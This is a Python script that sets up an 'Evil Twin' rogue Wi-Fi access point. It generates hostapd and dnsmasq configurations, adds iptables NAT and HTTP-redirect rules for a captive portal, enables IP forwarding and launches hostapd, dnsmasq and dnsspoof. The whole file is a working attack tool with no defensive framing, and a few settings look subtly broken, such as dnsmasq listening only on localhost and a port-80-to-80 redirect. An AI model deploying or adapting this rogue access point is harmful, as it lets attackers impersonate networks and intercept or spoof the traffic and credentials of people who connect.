import subprocess
import os

def create_hostapd_config(interface, ssid, channel):
    config_path = os.path.join(os.getcwd(), "hostapd.conf")
    config_content = f"""interface={interface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
ignore_broadcast_ssid=0
"""
    try:
        with open(config_path, "w") as f:
            f.write(config_content)
        print(f"hostapd configuration file created at: {config_path}")
        return config_path
    except Exception as e:
        print(f"Error creating hostapd.conf: {e}")
        return None


def create_dnsmasq_config(interface_name):
    config_path = os.path.join(os.getcwd(), "dnsmasq.conf")
    config_content = f"""interface={interface_name}
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
"""
    try:
        with open(config_path, "w") as f:
            f.write(config_content)
        print(f"dnsmasq configuration file created at: {config_path}")
        return config_path
    except Exception as e:
        print(f"Error ating dnsmasq.conf: {e}")
        return None


def run_command(command):
    try:
        print(f"[*] Running: {command}")
        subprocess.run(command, shell=True, check=True)
    except subprocess.CalledProcessError:
        print(f"[!] Failed: {command}")


def setup_fake_ap_network():
    # Bring up wlan0 with IP
    run_command("ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0")
    
    # Add static route
    run_command("route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1")

    # Redirect HTTP traffic to local port 80 (Captive Portal)
    run_command("iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 80")

    # Enable internet sharing from eth0 to wlan0
    run_command("iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE")
    run_command("iptables --append FORWARD --in-interface wlan0 -j ACCEPT")

    # Enable IP forwarding
    run_command("echo 1 | tee /proc/sys/net/ipv4/ip_forward")


def open_terminal_with_command(cmd):
    try:
        subprocess.Popen(['gnome-terminal', '--', 'bash', '-c', f'{cmd}; exec bash'])
        print(f"[+] Launched: {cmd}")
    except Exception as e:
        print(f"[!] Failed to launch command: {cmd}")
        print(e)


if __name__ == "__main__":
    wifi_interface = "wlan0"         # Your WiFi interface
    ssid = "EvilTwinNetwork"         # The fake network name
    channel = "6"                    # WiFi channel

    # Create configuration files
    hostapd_conf = create_hostapd_config(wifi_interface, ssid, channel)
    dnsmasq_conf = create_dnsmasq_config(wifi_interface)

    if hostapd_conf and dnsmasq_conf:
        setup_fake_ap_network()

        # Launch services in separate terminals
        commands = [
            "hostapd hostapd.conf",
            "dnsmasq -C dnsmasq.conf -d",
            "dnsspoof -i wlan0"
        ]

        for command in commands:
            open_terminal_with_command(command)
    else:
        print("[-] Failed to create required config files. Exiting.")
